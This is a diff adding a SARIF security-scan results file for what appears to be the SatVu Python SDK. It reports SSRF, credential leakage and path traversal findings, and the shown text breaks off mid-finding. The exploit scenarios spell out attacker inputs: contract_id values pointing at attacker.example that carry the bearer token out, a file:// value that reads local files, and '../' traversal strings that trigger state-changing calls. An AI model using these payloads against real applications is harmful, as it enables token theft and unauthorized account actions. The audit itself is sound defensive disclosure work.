@@ -1,0 +1,996 @@
+{
+  "$schema": "https://docs.oasis-open.org/sarif/sarif/v2.1.0/errata01/os/schemas/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Claude Security Plugin for Claude Code",
+          "organization": "Anthropic",
+          "informationUri": "https://claude.com/product/claude-security",
+          "version": "0.12.0",
+          "rules": [
+            {
+              "id": "CWE-918",
+              "name": "ServerSideRequestForgerySSRF",
+              "shortDescription": {
+                "text": "Server-Side Request Forgery (SSRF)"
+              },
+              "fullDescription": {
+                "text": "Server-Side Request Forgery (SSRF) (CWE-918, CWE 4.20): findings whose CWE is this entry of the Simplified Mapping view or rolls up to it, reported by Claude Security Plugin for Claude Code from static review of the source."
+              },
+              "help": {
+                "text": "Each alert's message names the finding's own CWE and states the impact, exploit scenario, preconditions and recommended fix; the finding appears under its F<n> id in CLAUDE-SECURITY-RESULTS.md."
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/918.html",
+              "properties": {
+                "tags": [
+                  "security",
+                  "external/cwe/cwe-918"
+                ]
+              }
+            },
+            {
+              "id": "CWE-522",
+              "name": "InsufficientlyProtectedCredentials",
+              "shortDescription": {
+                "text": "Insufficiently Protected Credentials"
+              },
+              "fullDescription": {
+                "text": "Insufficiently Protected Credentials (CWE-522, CWE 4.20): findings whose CWE is this entry of the Simplified Mapping view or rolls up to it, reported by Claude Security Plugin for Claude Code from static review of the source."
+              },
+              "help": {
+                "text": "Each alert's message names the finding's own CWE and states the impact, exploit scenario, preconditions and recommended fix; the finding appears under its F<n> id in CLAUDE-SECURITY-RESULTS.md."
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/522.html",
+              "properties": {
+                "tags": [
+                  "security",
+                  "external/cwe/cwe-522"
+                ]
+              }
+            },
+            {
+              "id": "CWE-22",
+              "name": "PathTraversal",
+              "shortDescription": {
+                "text": "Path Traversal"
+              },
+              "fullDescription": {
+                "text": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22, CWE 4.20): findings whose CWE is this entry of the Simplified Mapping view or rolls up to it, reported by Claude Security Plugin for Claude Code from static review of the source."
+              },
+              "help": {
+                "text": "Each alert's message names the finding's own CWE and states the impact, exploit scenario, preconditions and recommended fix; the finding appears under its F<n> id in CLAUDE-SECURITY-RESULTS.md."
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/22.html",
+              "properties": {
+                "tags": [
+                  "security",
+                  "external/cwe/cwe-22"
+                ]
+              }
+            }
+          ]
+        }
+      },
+      "automationDetails": {
+        "id": "claude-security-plugin/scan/c481680b-a056-4f95-8301-42f63d7c7e30",
+        "guid": "c481680b-a056-4f95-8301-42f63d7c7e30"
+      },
+      "invocations": [
+        {
+          "executionSuccessful": true,
+          "toolExecutionNotifications": [
+            {
+              "descriptor": {
+                "id": "coverage/skipped-component"
+              },
+              "level": "note",
+              "message": {
+                "text": "Skipped component github-workflows: CI workflow/dependabot config, not application code; low-value for a code-focused security review"
+              }
+            },
+            {
+              "descriptor": {
+                "id": "coverage/skipped-component"
+              },
+              "level": "note",
+              "message": {
+                "text": "Skipped component docs: Markdown documentation only, no executable code"
+              }
+            },
+            {
+              "descriptor": {
+                "id": "coverage/skipped-component"
+              },
+              "level": "note",
+              "message": {
+                "text": "Skipped component services-test-infra: Test fixtures/pytest conftest and request-body conformance checks used only by the generated test suite, excluded from the shipped wheel, not production runtime code"
+              }
+            },
+            {
+              "descriptor": {
+                "id": "coverage/files-not-reached"
+              },
+              "level": "note",
+              "message": {
+                "text": "Research coverage: of 451 files in the components researched, 356 read to a conclusion, 95 declared not reached, 0 in no researcher's account; 31 more outside every component"
+              }
+            }
+          ]
+        }
+      ],
+      "originalUriBaseIds": {
+        "%SRCROOT%": {
+          "description": {
+            "text": "The top level of the scanned repository, or the scanned directory when the scan did not run inside a git checkout."
+          }
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CWE-918",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "Relative path rebuilt into an absolute URL in the urllib3 adapter: the Bearer token goes to a host named in a path parameter.\n\nThis has the same flaw as StdlibAdapter. The absolute-URL check at line 197 runs on the '/'-prefixed path built by the services, but line 198 strips the '/' and urljoins. A path parameter such as contract_id='https://attacker.example/x?' (catalog contract_id: str) therefore becomes the request URL, and PoolManager.request sends it with the Authorization header added at line 215. Also CWE-522: The urllib3 adapter uses the same flawed pattern: the startswith check runs on the un-stripped url, then urljoin is applied to the lstripped value. A contract_id such as \"https://attacker.example/x\" coming through WalletService.get_credit_balance (api.py:57) therefore yields full_url on the attacker's host. The Authorization bearer token added at line 215 goes with it in pool_manager.request.\n\nImpact: The OAuth bearer token leaks to an attacker-chosen host, giving API access as the application's SatVu account.\n\nExploit scenario: In an environment where urllib3 is installed but httpx and requests are not (urllib3 is fourth in the auto-detect order), or where the integrator chose backend='urllib3', an application forwards a user-supplied contract_id to sdk.catalog.landing_page(). With contract_id='https://attacker.example/x?', the SDK sends GET https://attacker.example/x?/ with 'Authorization: Bearer <token>', and the attacker captures the application's API token.\n\nPreconditions: The application passes attacker-influenced text as the first path parameter (for example catalog contract_id); Urllib3Adapter is selected: chosen explicitly, or picked by auto-detection because httpx, httpx2 and requests are not installed.\n\nRecommendation: Join base_url and the path without lstrip+urljoin, or check that the resolved URL keeps the base_url scheme and host and reject it otherwise. Percent-encode path parameters in the generated service code. Also CWE-522: Apply the same fix as for the stdlib adapter: normalise the path first, refuse absolute or scheme-relative values (or concatenate rather than urljoin), check the final origin against base_url before adding Authorization, and URL-encode or UUID-validate path parameters in generated endpoints.\n\nCWE-918. Severity MEDIUM, confidence high."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/satvu/http/urllib3_adapter.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 198,
+                  "snippet": {
+                    "text": "            full_url = urljoin(self.base_url + \"/\", url.lstrip(\"/\"))"
+                  }
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "Urllib3Adapter.request",
+                  "fullyQualifiedName": "Urllib3Adapter.request"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "claudeSecurityPlugin": {
+              "id": "F1",
+              "title": "Relative path rebuilt into an absolute URL in the urllib3 adapter: the Bearer token goes to a host named in a path parameter",
+              "impact": "The OAuth bearer token leaks to an attacker-chosen host, giving API access as the application's SatVu account.",
+              "file": "src/satvu/http/urllib3_adapter.py",
+              "line": 198,
+              "description": "This has the same flaw as StdlibAdapter. The absolute-URL check at line 197 runs on the '/'-prefixed path built by the services, but line 198 strips the '/' and urljoins. A path parameter such as contract_id='https://attacker.example/x?' (catalog contract_id: str) therefore becomes the request URL, and PoolManager.request sends it with the Authorization header added at line 215. Also CWE-522: The urllib3 adapter uses the same flawed pattern: the startswith check runs on the un-stripped url, then urljoin is applied to the lstripped value. A contract_id such as \"https://attacker.example/x\" coming through WalletService.get_credit_balance (api.py:57) therefore yields full_url on the attacker's host. The Authorization bearer token added at line 215 goes with it in pool_manager.request.",
+              "exploit_scenario": "In an environment where urllib3 is installed but httpx and requests are not (urllib3 is fourth in the auto-detect order), or where the integrator chose backend='urllib3', an application forwards a user-supplied contract_id to sdk.catalog.landing_page(). With contract_id='https://attacker.example/x?', the SDK sends GET https://attacker.example/x?/ with 'Authorization: Bearer <token>', and the attacker captures the application's API token.",
+              "preconditions": [
+                "The application passes attacker-influenced text as the first path parameter (for example catalog contract_id)",
+                "Urllib3Adapter is selected: chosen explicitly, or picked by auto-detection because httpx, httpx2 and requests are not installed"
+              ],
+              "category": "Server-Side Request Forgery (SSRF)",
+              "severity": "MEDIUM",
+              "confidence": "high",
+              "recommendation": "Join base_url and the path without lstrip+urljoin, or check that the resolved URL keeps the base_url scheme and host and reject it otherwise. Percent-encode path parameters in the generated service code. Also CWE-522: Apply the same fix as for the stdlib adapter: normalise the path first, refuse absolute or scheme-relative values (or concatenate rather than urljoin), check the final origin against base_url before adding Authorization, and URL-encode or UUID-validate path parameters in generated endpoints.",
+              "cwe_id": "CWE-918",
+              "snippet": "            full_url = urljoin(self.base_url + \"/\", url.lstrip(\"/\"))",
+              "symbol": "Urllib3Adapter.request",
+              "declared_line": 198,
+              "via_change": null,
+              "other_cwe_ids": [
+                "CWE-522"
+              ],
+              "claudeSecurityPluginFindingId": "v3:f8895097b4c61ea1f80e95271af4e79a69feb60ba14f79595d05c64e5938440f",
+              "verification": {
+                "panel": {
+                  "true": 3,
+                  "false": 0,
+                  "voters": 3
+                }
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-918",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "Unencoded contract_id in the request path lets the caller choose the destination host, and the SDK bearer token goes with the request (stdlib/urllib3 backends).\n\ncontract_id is typed as UUID, but nothing checks that at runtime, and it goes into the request path with no URL-encoding (the builder template in endpoint_module.py.jinja uses a plain .format(), and no service calls quote() anywhere). The stdlib and urllib3 adapters only test for an absolute URL before stripping the leading '/', so an attacker-chosen 'https://host/...' value becomes the full request URL and the Authorization: Bearer header is attached to it.\n\nImpact: Theft of the application's SatVu OAuth bearer token (full API access as the integrating account until expiry, including spending credits). On all backends, the integrator's token can also be used for authenticated GETs to arbitrary SatVu API paths, with partial reflection of the response data in error messages.\n\nExploit scenario: A reseller portal calls sdk.wallet.get_credit_balance(request.args['contract_id']). The attacker submits contract_id='https://attacker.example/c?'. The SDK builds url '/https://attacker.example/c?/credit'. The stdlib adapter's startswith check fails because of the leading '/', lstrip removes the '/', and urljoin('https://api.satellitevu.com/wallet/v1/', 'https://attacker.example/c?/credit') returns 'https://attacker.example/c?/credit'. urlopen sends the GET with 'Authorization: Bearer <app OAuth token>', and the attacker records the token. They can then call every SatVu API (catalog, ordering, tasking, reseller) as the application until the token expires. On every backend, values such as '../../otm/v2/<id>/...?' send authenticated GETs to other SatVu API paths. Those responses fail CreditBalanceResponse validation, and parse_response puts the data keys and the pydantic error text (which includes input values) into the ValueError it raises.\n\nPreconditions: The integrating application passes a string influenced by an untrusted user (for example from a query parameter or form field) as contract_id to get_credit_balance, trusting the UUID type hint.; The HTTP backend is stdlib or urllib3. stdlib is what 'auto' picks on a default install with only pydantic, and urllib3 is picked when it is present without httpx/requests (for example via botocore). With the httpx and requests backends, '../' and '?' / '#' still change the path and query on api.satellitevu.com.\n\nRecommendation: In the endpoint template, coerce and encode path parameters: str(UUID(contract_id)) for UUID-typed params, and urllib.parse.quote(str(value), safe='') for all others. In the stdlib/urllib3 adapters, strip the '/' before checking for an absolute URL, or better, reject any final URL whose scheme/netloc differs from base_url before attaching the Authorization header.\n\nCWE-918. Severity MEDIUM, confidence high."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/satvu/services/wallet/api.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 57,
+                  "snippet": {
+                    "text": "url=f\"/{contract_id}/credit\","
+                  }
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "WalletService.get_credit_balance",
+                  "fullyQualifiedName": "WalletService.get_credit_balance"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "claudeSecurityPlugin": {
+              "id": "F2",
+              "title": "Unencoded contract_id in the request path lets the caller choose the destination host, and the SDK bearer token goes with the request (stdlib/urllib3 backends)",
+              "impact": "Theft of the application's SatVu OAuth bearer token (full API access as the integrating account until expiry, including spending credits). On all backends, the integrator's token can also be used for authenticated GETs to arbitrary SatVu API paths, with partial reflection of the response data in error messages.",
+              "file": "src/satvu/services/wallet/api.py",
+              "line": 57,
+              "description": "contract_id is typed as UUID, but nothing checks that at runtime, and it goes into the request path with no URL-encoding (the builder template in endpoint_module.py.jinja uses a plain .format(), and no service calls quote() anywhere). The stdlib and urllib3 adapters only test for an absolute URL before stripping the leading '/', so an attacker-chosen 'https://host/...' value becomes the full request URL and the Authorization: Bearer header is attached to it.",
+              "exploit_scenario": "A reseller portal calls sdk.wallet.get_credit_balance(request.args['contract_id']). The attacker submits contract_id='https://attacker.example/c?'. The SDK builds url '/https://attacker.example/c?/credit'. The stdlib adapter's startswith check fails because of the leading '/', lstrip removes the '/', and urljoin('https://api.satellitevu.com/wallet/v1/', 'https://attacker.example/c?/credit') returns 'https://attacker.example/c?/credit'. urlopen sends the GET with 'Authorization: Bearer <app OAuth token>', and the attacker records the token. They can then call every SatVu API (catalog, ordering, tasking, reseller) as the application until the token expires. On every backend, values such as '../../otm/v2/<id>/...?' send authenticated GETs to other SatVu API paths. Those responses fail CreditBalanceResponse validation, and parse_response puts the data keys and the pydantic error text (which includes input values) into the ValueError it raises.",
+              "preconditions": [
+                "The integrating application passes a string influenced by an untrusted user (for example from a query parameter or form field) as contract_id to get_credit_balance, trusting the UUID type hint.",
+                "The HTTP backend is stdlib or urllib3. stdlib is what 'auto' picks on a default install with only pydantic, and urllib3 is picked when it is present without httpx/requests (for example via botocore). With the httpx and requests backends, '../' and '?' / '#' still change the path and query on api.satellitevu.com."
+              ],
+              "category": "Server-Side Request Forgery (SSRF)",
+              "severity": "MEDIUM",
+              "confidence": "high",
+              "recommendation": "In the endpoint template, coerce and encode path parameters: str(UUID(contract_id)) for UUID-typed params, and urllib.parse.quote(str(value), safe='') for all others. In the stdlib/urllib3 adapters, strip the '/' before checking for an absolute URL, or better, reject any final URL whose scheme/netloc differs from base_url before attaching the Authorization header.",
+              "cwe_id": "CWE-918",
+              "snippet": "url=f\"/{contract_id}/credit\",",
+              "symbol": "WalletService.get_credit_balance",
+              "declared_line": 57,
+              "via_change": null,
+              "other_cwe_ids": [],
+              "claudeSecurityPluginFindingId": "v3:067f3a6af5628e4c9ec30b45d96f092df31c1fd40a5d9ced24979347a2300f4d",
+              "verification": {
+                "panel": {
+                  "true": 3,
+                  "false": 0,
+                  "voters": 3
+                }
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-522",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "urllib3 adapter uses the same lstrip+urljoin join, so a scheme-prefixed catalog contract_id sends the Bearer token to an attacker host.\n\nThe unencoded contract_id from CatalogService (api.py:98 and every other method) reaches the urllib3 adapter as f\"/{contract_id}/...\". The adapter strips the leading '/' after its absolute-URL check and urljoins the result, so 'https://attacker/...' replaces base_url. It then adds the Bearer token and calls PoolManager.request on that host without checking the origin.\n\nImpact: The integrator's SatVu OAuth access token is exposed to an attacker-chosen host, giving the attacker the service account's API privileges for the token's lifetime.\n\nExploit scenario: In an application where urllib3 is the auto-selected or configured backend, an attacker supplies contract_id=\"https://attacker.example/c\" to any catalog call, for example post_search or get_item. The request, with 'Authorization: Bearer <token>', goes to attacker.example. With an http:// prefix it goes in cleartext. The attacker reuses the captured token against the SatVu API.\n\nPreconditions: The integrating application passes attacker-influenced input as contract_id; The urllib3 backend is selected, either explicitly or by auto-detection when urllib3 is installed but httpx, httpx2 and requests are not.\n\nRecommendation: Percent-encode path parameters in the generated client, and after joining URLs enforce that the target's scheme and netloc match base_url before adding the Authorization header. The requests and httpx adapters already keep relative paths on the base host and can serve as the reference.\n\nCWE-522. Severity MEDIUM, confidence high."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/satvu/http/urllib3_adapter.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 215,
+                  "snippet": {
+                    "text": "req_headers[\"Authorization\"] = f\"Bearer {token}\""
+                  }
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "Urllib3Adapter.request",
+                  "fullyQualifiedName": "Urllib3Adapter.request"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "claudeSecurityPlugin": {
+              "id": "F3",
+              "title": "urllib3 adapter uses the same lstrip+urljoin join, so a scheme-prefixed catalog contract_id sends the Bearer token to an attacker host",
+              "impact": "The integrator's SatVu OAuth access token is exposed to an attacker-chosen host, giving the attacker the service account's API privileges for the token's lifetime.",
+              "file": "src/satvu/http/urllib3_adapter.py",
+              "line": 215,
+              "description": "The unencoded contract_id from CatalogService (api.py:98 and every other method) reaches the urllib3 adapter as f\"/{contract_id}/...\". The adapter strips the leading '/' after its absolute-URL check and urljoins the result, so 'https://attacker/...' replaces base_url. It then adds the Bearer token and calls PoolManager.request on that host without checking the origin.",
+              "exploit_scenario": "In an application where urllib3 is the auto-selected or configured backend, an attacker supplies contract_id=\"https://attacker.example/c\" to any catalog call, for example post_search or get_item. The request, with 'Authorization: Bearer <token>', goes to attacker.example. With an http:// prefix it goes in cleartext. The attacker reuses the captured token against the SatVu API.",
+              "preconditions": [
+                "The integrating application passes attacker-influenced input as contract_id",
+                "The urllib3 backend is selected, either explicitly or by auto-detection when urllib3 is installed but httpx, httpx2 and requests are not"
+              ],
+              "category": "Insufficiently Protected Credentials",
+              "severity": "MEDIUM",
+              "confidence": "high",
+              "recommendation": "Percent-encode path parameters in the generated client, and after joining URLs enforce that the target's scheme and netloc match base_url before adding the Authorization header. The requests and httpx adapters already keep relative paths on the base host and can serve as the reference.",
+              "cwe_id": "CWE-522",
+              "snippet": "req_headers[\"Authorization\"] = f\"Bearer {token}\"",
+              "symbol": "Urllib3Adapter.request",
+              "declared_line": 215,
+              "via_change": null,
+              "other_cwe_ids": [],
+              "claudeSecurityPluginFindingId": "v3:f357a406dd44324a55604eee13ab961f94dcdfb9d617172973838de76e34e4eb",
+              "verification": {
+                "panel": {
+                  "true": 3,
+                  "false": 0,
+                  "voters": 3
+                }
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-918",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "Relative path rebuilt into an absolute URL: a path segment starting with a scheme sends the Bearer token to any host (or a file:// read).\n\nThe service layer marks every path as relative by putting a '/' in front of it (catalog: url=f\"/{contract_id}/search\", with contract_id typed str and never encoded). The adapter checks for an absolute URL on the original string, then strips the leading '/' and calls urljoin. If the caller-supplied segment starts with 'https://host' or 'file:///', urljoin returns it as an absolute URL, so urlopen sends the request, with the Authorization header added at line 218, to that host or local file. Also CWE-522: The untrusted source is contract_id in WalletService.get_credit_balance. It is interpolated unencoded into \"/{contract_id}/credit\" (api.py:57). The adapter checks for an absolute URL at line 200, but before it strips the leading '/'. So \"/https://attacker.example/x/credit\" passes the check, and after lstrip urljoin returns the attacker's absolute URL unchanged (CPython urljoin returns `url` when it has a netloc or a different scheme). The Authorization: Bearer token added at line 218 then goes to that host via urlopen at line 239.\n\nImpact: The SatVu OAuth bearer token leaks to a host the attacker picks, giving API access as the application's account (confidentiality and integrity of orders, plus spend). The file:// scheme also allows local file reads that may be returned to the caller.\n\nExploit scenario: An application built on the SDK passes a user-supplied contract identifier to sdk.catalog.get_search(contract_id=...), as examples/catalog.py does with its own value. The attacker submits contract_id='https://attacker.example/c?'. The URL becomes '/https://attacker.example/c?/search', the adapter turns it into 'https://attacker.example/c?/search&limit=10', and urlopen sends GET to attacker.example with 'Authorization: Bearer <app OAuth token>'. The attacker now holds the application's SatVu API token and can read orders or place paid tasking orders. With contract_id='file:///path/to/secret.json#' the stdlib adapter instead reads a local file. The status is -1, so the service does not raise. If the file is JSON its parsed content comes back from the SDK call; if not, the first 200 characters land in the JsonDecodeError body_preview.\n\nPreconditions: The application passes attacker-influenced text as a path parameter that comes first in the URL (catalog contract_id is typed str; UUID-typed parameters elsewhere are not checked at runtime); StdlibAdapter is in use. It is the auto-selected backend when httpx, httpx2, requests and urllib3 are absent, which is the default 'pip install satvu' install.\n\nRecommendation: Do not strip the leading '/' before joining. Build the URL by string concatenation of base_url and the path, or check after urljoin that the scheme and netloc of the result equal those of base_url, and reject anything else. Allow only http/https schemes before calling urlopen, and attach Authorization only when the final host matches base_url. In the generated services, percent-encode path parameters with urllib.parse.quote(str(v), safe=''). Also CWE-522: In the adapter, strip the leading slashes first and then reject any value that parses as having a scheme or netloc. Or build the URL by plain concatenation as requests_adapter does, and check that the final URL's scheme and host match base_url before attaching Authorization. In the generated endpoint template, URL-encode path parameters (urllib.parse.quote(str(v), safe='')), or coerce them with UUID(str(contract_id)) before interpolation.\n\nCWE-918. Severity MEDIUM, confidence medium."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/satvu/http/stdlib_adapter.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 201,
+                  "snippet": {
+                    "text": "            full_url = urljoin(self.base_url + \"/\", url.lstrip(\"/\"))"
+                  }
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "StdlibAdapter.request",
+                  "fullyQualifiedName": "StdlibAdapter.request"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "claudeSecurityPlugin": {
+              "id": "F4",
+              "title": "Relative path rebuilt into an absolute URL: a path segment starting with a scheme sends the Bearer token to any host (or a file:// read)",
+              "impact": "The SatVu OAuth bearer token leaks to a host the attacker picks, giving API access as the application's account (confidentiality and integrity of orders, plus spend). The file:// scheme also allows local file reads that may be returned to the caller.",
+              "file": "src/satvu/http/stdlib_adapter.py",
+              "line": 201,
+              "description": "The service layer marks every path as relative by putting a '/' in front of it (catalog: url=f\"/{contract_id}/search\", with contract_id typed str and never encoded). The adapter checks for an absolute URL on the original string, then strips the leading '/' and calls urljoin. If the caller-supplied segment starts with 'https://host' or 'file:///', urljoin returns it as an absolute URL, so urlopen sends the request, with the Authorization header added at line 218, to that host or local file. Also CWE-522: The untrusted source is contract_id in WalletService.get_credit_balance. It is interpolated unencoded into \"/{contract_id}/credit\" (api.py:57). The adapter checks for an absolute URL at line 200, but before it strips the leading '/'. So \"/https://attacker.example/x/credit\" passes the check, and after lstrip urljoin returns the attacker's absolute URL unchanged (CPython urljoin returns `url` when it has a netloc or a different scheme). The Authorization: Bearer token added at line 218 then goes to that host via urlopen at line 239.",
+              "exploit_scenario": "An application built on the SDK passes a user-supplied contract identifier to sdk.catalog.get_search(contract_id=...), as examples/catalog.py does with its own value. The attacker submits contract_id='https://attacker.example/c?'. The URL becomes '/https://attacker.example/c?/search', the adapter turns it into 'https://attacker.example/c?/search&limit=10', and urlopen sends GET to attacker.example with 'Authorization: Bearer <app OAuth token>'. The attacker now holds the application's SatVu API token and can read orders or place paid tasking orders. With contract_id='file:///path/to/secret.json#' the stdlib adapter instead reads a local file. The status is -1, so the service does not raise. If the file is JSON its parsed content comes back from the SDK call; if not, the first 200 characters land in the JsonDecodeError body_preview.",
+              "preconditions": [
+                "The application passes attacker-influenced text as a path parameter that comes first in the URL (catalog contract_id is typed str; UUID-typed parameters elsewhere are not checked at runtime)",
+                "StdlibAdapter is in use. It is the auto-selected backend when httpx, httpx2, requests and urllib3 are absent, which is the default 'pip install satvu' install"
+              ],
+              "category": "Server-Side Request Forgery (SSRF)",
+              "severity": "MEDIUM",
+              "confidence": "medium",
+              "recommendation": "Do not strip the leading '/' before joining. Build the URL by string concatenation of base_url and the path, or check after urljoin that the scheme and netloc of the result equal those of base_url, and reject anything else. Allow only http/https schemes before calling urlopen, and attach Authorization only when the final host matches base_url. In the generated services, percent-encode path parameters with urllib.parse.quote(str(v), safe=''). Also CWE-522: In the adapter, strip the leading slashes first and then reject any value that parses as having a scheme or netloc. Or build the URL by plain concatenation as requests_adapter does, and check that the final URL's scheme and host match base_url before attaching Authorization. In the generated endpoint template, URL-encode path parameters (urllib.parse.quote(str(v), safe='')), or coerce them with UUID(str(contract_id)) before interpolation.",
+              "cwe_id": "CWE-918",
+              "snippet": "            full_url = urljoin(self.base_url + \"/\", url.lstrip(\"/\"))",
+              "symbol": "StdlibAdapter.request",
+              "declared_line": 201,
+              "via_change": null,
+              "other_cwe_ids": [
+                "CWE-522"
+              ],
+              "claudeSecurityPluginFindingId": "v3:ecb3334c8d9663693fc66faac301164b6d2f2981e63ae0459972ffc3e4de7deb",
+              "verification": {
+                "panel": {
+                  "true": 2,
+                  "false": 1,
+                  "voters": 3
+                }
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-22",
+          "ruleIndex": 2,
+          "level": "warning",
+          "message": {
+            "text": "Unencoded item_id in streaming download URL lets the caller's input pick which API resource is written to disk.\n\nThe untrusted item_id goes into the request path without quoting, so '../' segments and '?' redirect the authenticated GET to another path on the API host. stream_to_file (core.py:316-318) then writes any non-4xx/5xx response body to output_path without checking status or Content-Type. Also CWE-918: Same unencoded item_id interpolation as download_order_item, in the streaming variant. Here every non-4xx/5xx response body from the redirected path is written straight to output_path by stream_to_file. Status code and Content-Type are never checked, so any authenticated GET response the attacker steers the request to ends up in the file the app will serve as the download.\n\nImpact: The attacker gets imagery or JSON data from resources the application did not authorize, read through the app's own SatVu credentials.\n\nExploit scenario: An application lets users download imagery from orders it has authorized for them by calling download_order_item_to_file(contract_id, authorized_order_id, user_item_id, tmp_path) and serving tmp_path back. With user_item_id='../<other_order_id>/<item>', or a deeper '../' chain plus a trailing '?' to reach other services' GET endpoints, the app's token fetches a resource outside the authorized order. The response is saved and returned to the attacker as a successful download.\n\nPreconditions: The integrating application passes an untrusted string as item_id; The application returns the written file to the requester.\n\nRecommendation: Percent-encode path parameters (quote(str(item_id), safe='')) in the generated template. In stream_to_file, check that the final response is 200 with an expected binary Content-Type before writing. Also CWE-918: URL-encode item_id (and stringify and validate the UUID parameters) before building the path. Also check the status code and the expected Content-Type before streaming the body to disk.\n\nCWE-22. Severity MEDIUM, confidence medium."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/satvu/services/cos/api.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 447,
+                  "snippet": {
+                    "text": "            url=f\"/{contract_id}/{order_id}/{item_id}/download\","
+                  }
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "CosService.download_order_item_to_file",
+                  "fullyQualifiedName": "CosService.download_order_item_to_file"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "claudeSecurityPlugin": {
+              "id": "F5",
+              "title": "Unencoded item_id in streaming download URL lets the caller's input pick which API resource is written to disk",
+              "impact": "The attacker gets imagery or JSON data from resources the application did not authorize, read through the app's own SatVu credentials.",
+              "file": "src/satvu/services/cos/api.py",
+              "line": 447,
+              "description": "The untrusted item_id goes into the request path without quoting, so '../' segments and '?' redirect the authenticated GET to another path on the API host. stream_to_file (core.py:316-318) then writes any non-4xx/5xx response body to output_path without checking status or Content-Type. Also CWE-918: Same unencoded item_id interpolation as download_order_item, in the streaming variant. Here every non-4xx/5xx response body from the redirected path is written straight to output_path by stream_to_file. Status code and Content-Type are never checked, so any authenticated GET response the attacker steers the request to ends up in the file the app will serve as the download.",
+              "exploit_scenario": "An application lets users download imagery from orders it has authorized for them by calling download_order_item_to_file(contract_id, authorized_order_id, user_item_id, tmp_path) and serving tmp_path back. With user_item_id='../<other_order_id>/<item>', or a deeper '../' chain plus a trailing '?' to reach other services' GET endpoints, the app's token fetches a resource outside the authorized order. The response is saved and returned to the attacker as a successful download.",
+              "preconditions": [
+                "The integrating application passes an untrusted string as item_id",
+                "The application returns the written file to the requester"
+              ],
+              "category": "Path Traversal",
+              "severity": "MEDIUM",
+              "confidence": "medium",
+              "recommendation": "Percent-encode path parameters (quote(str(item_id), safe='')) in the generated template. In stream_to_file, check that the final response is 200 with an expected binary Content-Type before writing. Also CWE-918: URL-encode item_id (and stringify and validate the UUID parameters) before building the path. Also check the status code and the expected Content-Type before streaming the body to disk.",
+              "cwe_id": "CWE-22",
+              "snippet": "            url=f\"/{contract_id}/{order_id}/{item_id}/download\",",
+              "symbol": "CosService.download_order_item_to_file",
+              "declared_line": 447,
+              "via_change": null,
+              "other_cwe_ids": [
+                "CWE-918"
+              ],
+              "claudeSecurityPluginFindingId": "v3:77bf00f2379257f69b6481198499a61f085993d680062464bf5765ef5c27fc6f",
+              "verification": {
+                "panel": {
+                  "true": 2,
+                  "false": 1,
+                  "voters": 3
+                }
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-22",
+          "ruleIndex": 2,
+          "level": "warning",
+          "message": {
+            "text": "Webhook id is put into the URL path without encoding, so rotate_webhook_signing_key can POST to /client/reset or other endpoints.\n\nThe caller-supplied `id` (annotated UUID but never checked or converted) goes into the request path verbatim. A string containing `../`, `#` or `?` changes which endpoint the authenticated POST reaches. Every adapter resolves dot segments (urljoin in stdlib/urllib3, URL normalisation in httpx/requests) and drops the fragment, and the Bearer token is still attached. Also CWE-918: The `id` argument is only type-hinted as UUID and is never validated or percent-encoded. It goes verbatim into the request path, and the adapter normalises that path (stdlib/urllib3 `urljoin(self.base_url + '/', url.lstrip('/'))` resolves `../`) before sending it with the integrator's bearer token. A string id holding `../` and `?` therefore sends the request to an endpoint of the caller's choice instead of `/webhooks/{id}/rotate`. get_webhook (200), delete_webhook (235), edit_webhook (281) and test_webhook (387) have the same flaw.\n\nImpact: Integrity and availability: an attacker who controls only a webhook id can make the application run state-changing POSTs on other SatVu API endpoints with its credentials, for example resetting its client secret, which causes a denial of service for the integration.\n\nExploit scenario: An integrating application (for example a reseller portal) lets its end users rotate a webhook signing key by id and passes the request value to sdk.id.rotate_webhook_signing_key(id). The attacker submits id=\"../client/reset#\". The path becomes /id/v3/webhooks/../client/reset#/rotate, which resolves to POST https://api.satellitevu.com/id/v3/client/reset with the application's Bearer token. That rotates the application's M2M client secret and cuts off its API access. id=\"../client#\" reaches POST /client instead (create M2M client), and \"../../<service>/...\" reaches other services on the same host with the same token.\n\nPreconditions: The integrating application passes an untrusted string as the webhook id (the UUID annotation is not enforced at runtime); The application's token is allowed to call the traversed-to endpoint.\n\nRecommendation: Validate path parameters before building the URL, 